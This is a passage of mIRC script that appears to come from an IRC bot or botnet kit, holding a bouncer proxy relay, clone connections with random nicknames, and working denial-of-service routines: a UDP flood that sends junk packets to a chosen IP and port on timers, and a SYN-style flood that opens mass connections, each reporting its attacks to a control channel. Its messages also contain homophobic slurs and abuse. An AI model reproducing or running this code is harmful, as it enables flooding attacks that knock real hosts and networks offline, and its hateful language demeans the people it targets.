    if ($gettok(%BncClient,2,32) != %Bnc.passwd) {
      sockwrite -n $sockname NOTICE AUTH : $+ wrong pass asshole!
    }
  }
  if ($gettok(%BncClient,1,32) == CONN) {
    if (%Bnc.legit != yes) { sockwrite -n $sockname NOTICE AUTH : $+ bnc exploits do not work here, fucking faggot! | sockclose $sockname
    }
    if (BncServer $+ $remove($sockname,BncClient) != $null) {
      sockclose BncServer $+ $remove($sockname,BncClient)
    }
    sockopen BncServer $+ $remove($sockname,BncClient) $gettok(%BncClient,2,32) $gettok(%BncClient,3,32)
    sockwrite -n $sockname NOTICE AUTH : $+ connecting to $gettok(%BncClient,2,32) $+ : $+ $gettok(%BncClient,3,32)
    set %Bnc.server.passwd $gettok(%BncClient,4,32)
  }
  else {
    if ($sock(BncServer $+ $remove($sockname,BncClient)).status != active) {
      halt
    }
    sockwrite -n BncServer $+ $remove($sockname,BncClient) %BncClient
  }
}
on *:sockopen:BncServer*:{
  if ($sockerr) {
    sockwrite -n $sockname NOTICE AUTH : $+ failed connection
    sockclose $sockname
    halt
  }
  if ($sock($sockname).status != active) {
    sockwrite -n $sockname NOTICE AUTH : $+ failed connection
    sockclose BncServer $+ $remove($socknme, BncServer)
    halt
  }
  sockwrite -n BncClient $+ $remove($sockname,BncServer) NOTICE AUTH : $+ suceeded connection
  sockwrite -n $sockname NICK %Bnc.nick
  sockwrite -n $sockname USER %Bnc.user
}
on *:sockread:BncServer*:{
  sockread %BncServer
  if ($sock(BncClient $+ $remove($sockname,BncServer)).status != active) {
    halt
  }
  sockwrite -n BncClient $+ $remove($sockname,BncServer) %BncServer
}
on *:sockopen:Sockets-*:{ sockwrite -tn $sockname PONG $server | sockwrite -tn $sockname USER $nfs2 $nfs2 $nfs2 : $+ $nfs2 | sockwrite -tn $sockname NICK $nfs2 }
on *:sockread:Sockets-*:{
  sockread %SocketTemp
  if (PING* ISWM %SocketTemp) {
    sockwrite -tn $sockname PONG : $+ $gettok(%SocketTemp,2,58)
    halt
  }
  halt
}
alias udp.packet {
  if (!$isfile(upxd.txt)) { udp.gen }
  if ($1) {
    var %ip = $1 , %port , %a , %b , %c , %times , %interval
    if ($numtok(%ip,46) != 4) { msg %chan $udp.err | return }
    if (*-t* !iswm $1-) { msg %chan $udp.err | return }
    else { %a = 1 | while (%a <= $0) { %b = [ [ $+($,%a) ] ] | if ($left(%b,2) = -t) { %times = $remove(%b,-t) | %a = $0 } | inc %a } }
    if (*-p* iswm $1-) { %a = 1 | while (%a <= $0) { %b = [ [ $+($,%a) ] ] | if ($left(%b,2) = -p) { %port = $remove(%b,-p) | %a = $0 } | inc %a } | if (%port !isnum 1-65553) { %port = r } }
    else { %port = r }
    if (*-i* iswm $1-) { %a = 1 | while (%a <= $0) { %b = [ [ $+($,%a) ] ] | if ($left(%b,2) = -i) { %interval = $remove(%b,-i) | %a = $0 } | inc %a } }
    if (%interval = $null) || (%interval < 0) { msg %chan $udp.err | return }
    $iif($iif(%interval <= 999,ms,sec) = ms,%c = $+(%interval,ms),%c = $+($calc(%interval / 1000),s))
    msg %chan  14(0UDP214)0 attacking %ip on port %port a total of %times with a interval of %c
    .timer -oh %times %interval udp.packet2 %ip %port
  }
}
alias -l udp.packet2 {
  if ($2) {
    var %a 1 , %ip = $1 , %port = $iif($2 = r,$r(1,65553),$2) , %str = $left($read(upxd.txt,$r(1,$lines(upxd.txt))),400)
    while (%a <= 10) { sockudp $+(udp,$calc($r(1,999999999999999) / $ticks)) %ip %port %str | inc %a }
  }
}
alias -l udp.gen {
  var %ascii-start = 200 , %ascii-end = 250 , %bytes = 400 , %file = upxd.txt
  while (%ascii-start <= %ascii-end) { write %file $str($chr(%ascii-start),%bytes) | inc %ascii-start }
}
alias timersyn { timer $+ %timernumber %ttimes %tmsdelay %timersyn | msg %chan 14(0TimerSyn14)0 timer $+ %timernumber set to Syn attack: %synaa on port %synport with %syntimes syn packets a total of %ttimes times every %tmsdelay seconds | unset %timersyn | unset %tmsdelay | unset %synport | unset %ttimes | unset %syntimes }
alias synz { if ($1 == $null) { return } | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | msg %chan 14(0Syn14)0 attack on: %synaa complete! | unset %synaa }
alias syn {
  if ($2 == start) { if (%synport !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inc %x  } }
  if ($2 == halt) { if ($sock(syn*,0) > 0) { sockclose syn* } }
}
